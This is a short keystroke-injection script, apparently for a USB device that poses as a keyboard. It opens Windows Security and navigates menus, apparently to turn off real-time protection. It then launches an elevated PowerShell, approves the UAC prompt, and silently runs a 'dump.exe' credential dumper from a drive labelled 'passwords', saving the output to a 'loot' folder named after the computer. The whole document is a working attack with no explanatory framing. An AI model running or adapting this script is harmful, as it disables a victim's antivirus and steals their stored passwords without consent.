layout('us');
press("GUI");
delay(500);
type("windows security")
delay(2500);
press("ENTER");
delay(600);
press("TAB");
delay(200);
press("TAB");
delay(200);
press("DOWN");
delay(200);
press("ENTER");
delay(200);
press("TAB");
delay(200);
press("TAB");
delay(200);
press("TAB");
delay(200);
press("TAB");
delay(200);
press("ENTER");
delay(200);
press("SPACE");
delay(500);
press("SHIFT TAB");
delay(500);
press("ENTER");
delay(500);
press("ALT F4");
delay(500);
press("GUI r");
delay(500);
type("powershell")
delay(1000);
press("CTRL SHIFT ENTER")
delay(500);
press("SHIFT TAB");
delay(100);
press("ENTER");
delay(500);
press("ALT y");
delay(500);
type("$dest = ((Get-WmiObject win32_volume -f 'label=''passwords''').Name+'\\loot\\')\n")
delay(200);
type("$filter = 'password_'+ $env:COMPUTERNAME; $filecount = ((Get-ChildItem -filter ($filter + \"*\") -path $dest | Measure-Object | Select -ExpandProperty Count) + 1)\n")
delay(200);
type("Start-Process -WindowStyle Hidden -FilePath ((Get-WmiObject win32_volume -f 'label=''passwords''').Name+'\\tools\\dump.exe') -ArgumentList 'all' -RedirectStandardOutput ($dest +'\\' + $filter +'_' + $filecount +'.txt')\n")
delay(1000);
type("exit\n")



